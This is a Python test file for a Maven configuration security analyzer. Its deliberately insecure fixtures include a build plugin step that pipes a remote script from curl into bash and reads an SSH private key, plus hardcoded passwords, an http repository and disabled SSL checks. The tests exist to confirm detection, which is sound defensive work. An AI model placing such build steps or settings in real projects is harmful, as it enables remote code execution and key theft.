"""Tests for MavenAnalyzer."""

from pathlib import Path

from devai.maven_analyzer import MavenAnalyzer, MavenFinding


INSECURE_POM = """\
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>insecure-app</artifactId>
  <version>1.0.0-SNAPSHOT</version>

  <repositories>
    <repository>
      <id>insecure</id>
      <url>http://insecure-maven.example.com/maven2</url>
    </repository>
  </repositories>

  <dependencies>
    <dependency>
      <groupId>com.example</groupId>
      <artifactId>library</artifactId>
      <version>LATEST</version>
    </dependency>
    <dependency>
      <groupId>com.bad</groupId>
      <artifactId>artifact</artifactId>
      <version>RELEASE</version>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <configuration>
          <executable>sh</executable>
          <arguments>
            <argument>-c</argument>
            <argument>curl -s https://install.example.com/script.sh | bash &amp;&amp; cat /home/user/.ssh/id_rsa</argument>
          </arguments>
        </configuration>
      </plugin>
    </plugins>
  </build>

  <properties>
    <gpg.passphrase>hardcoded-signing-passphrase</gpg.passphrase>
  </properties>
</project>
"""

INSECURE_SETTINGS = """\
<settings>
  <servers>
    <server>
      <id>deploy</id>
      <username>deploy-user</username>
      <password>hardcoded-deploy-password</password>
    </server>
  </servers>
  <profiles>
    <profile>
      <id>insecure</id>
      <properties>
        <maven.wagon.http.ssl.insecure>true</maven.wagon.http.ssl.insecure>
        <maven.wagon.http.ssl.allowall>true</maven.wagon.http.ssl.allowall>
      </properties>
    </profile>
  </profiles>
</settings>
"""

HARDENED_POM = """\
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>hardened-app</artifactId>
  <version>1.0.0</version>

  <dependencies>
    <dependency>
      <groupId>com.example</groupId>
      <artifactId>library</artifactId>
      <version>1.2.3</version>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.11.0</version>
      </plugin>
    </plugins>
  </build>
</project>
"""


class TestMavenAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "pom.xml").write_text(INSECURE_POM, encoding="utf-8")
        (tmp_path / "settings.xml").write_text(INSECURE_SETTINGS, encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "dynamic_version" in kinds
        assert "curl_pipe_shell" in kinds
        assert "sensitive_path" in kinds
        assert "insecure_ssl" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "pom.xml").write_text(HARDENED_POM, encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        assert analyzer.health_score() >= 95.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "pom.xml").write_text(INSECURE_POM, encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        finding = analyzer.analyze()[0]
        assert isinstance(finding, MavenFinding)
        assert "[high]" in finding.format() or "[medium]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pom.xml").write_text(INSECURE_POM, encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        assert "Maven configs: 1" in analyzer.summary()
        context = analyzer.to_context()
        assert "Maven analysis:" in context

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = MavenAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert "https://repo.maven.apache.org/maven2" in config
        assert "settings-security.xml" in config

    def test_detects_mvn_config(self, tmp_path: Path):
        mvn_dir = tmp_path / ".mvn"
        mvn_dir.mkdir()
        (mvn_dir / "maven.config").write_text(
            "-Dmaven.wagon.http.ssl.insecure=true\n",
            encoding="utf-8",
        )
        analyzer = MavenAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1
        kinds = {f.kind for f in analyzer.analyze()}
        assert "insecure_ssl" in kinds

    def test_project_health_includes_maven_category(self, tmp_path: Path):
        from devai.project_health import ProjectHealth

        (tmp_path / "pom.xml").write_text(HARDENED_POM, encoding="utf-8")
        report = ProjectHealth(str(tmp_path), scan_secrets=False).analyze()
        names = {c.name for c in report.categories}
        assert "maven" in names
